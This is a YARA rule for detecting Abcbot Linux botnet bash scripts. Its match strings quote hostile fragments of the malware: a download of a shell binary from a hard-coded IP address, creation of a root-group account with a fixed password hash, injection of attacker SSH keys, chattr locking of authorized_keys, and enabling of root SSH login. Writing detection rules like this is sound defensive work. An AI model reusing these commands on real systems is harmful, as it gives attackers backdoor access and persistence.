rule BASH_linux_ABCBot {
   meta:
      description = "Detects Abcbot bash scripts."
      author = "KrknSec"
      reference = "https://malpedia.caad.fkie.fraunhofer.de/details/elf.abcbot"
      date = "2022-09-29"
   strings:
      $x1 = "if [ -f \"/opt/logger/.ssh/authorized_keys\" ]; then" fullword ascii
      $x2 = "# downloads \"http://103.209.103.16:26800/linux64-shell\" /tmp/linux64-shell \"http://103.209.103.16:26800/linux64-shell\"" fullword ascii
      $x3 = "rm -f /opt/logger/.ssh/authorized_keys" fullword ascii
      $x4 = "useradd -p '$6$utSZizcD$9Lak0brZKRt7ZVv/Wf5VpSCnazFNUrpXEy8d.mvx9V.TNG4VHvCH6kVT/qqQ4t8636gn235Ee93/RRdyohoMK1' -G root -s /bin/" ascii

      $s4 = "# sed -i -e 's/\\#PermitRootLogin/PermitRootLogin/g' -e 's/\\PermitRootLogin no/PermitRootLogin yes/g' -e 's/PermitRootLogin wit" ascii
      $s5 = "sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoLLx+\\/ZJnMGV2c7T1GGkl1jkyJJ6unLU6nQ7cOo2Qdwp+ommzKhyYEW8HExtgZqzLcGeKksSPU1nvsmo" ascii
      $s6 = "# echo \"echo \\\"\\`date '+%Y%m%d %H:%M:%S'\\` startlink at linux start...\\\" >> /root/aaa.log\"" fullword ascii
      $s7 = "# echo \"*/2 * * * * echo \\\"\\`date '+\\%Y\\%m\\%d \\%H:\\%M:\\%S'\\` start crontab...\\\" >> aaa.log\" >>~/cron || true &&" fullword ascii
      $s8 = "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqVbCCeU1HI8DKQ8" ascii
      $s9 = "sh root@localhost.localdomain\" >>/opt/logger/.ssh/authorized_keys" fullword ascii
      $s10 = "sudo chattr +ia /opt/logger/.ssh/authorized_keys" fullword ascii
      $s11 = "sudo chattr -ia /opt/logger/.ssh/authorized_keys" fullword ascii
      $s12 = "# sed -i -e 's/\\#PermitRootLogin/PermitRootLogin/g' -e 's/\\PermitRootLogin no/PermitRootLogin yes/g' -e 's/PermitRootLogin wit" ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}
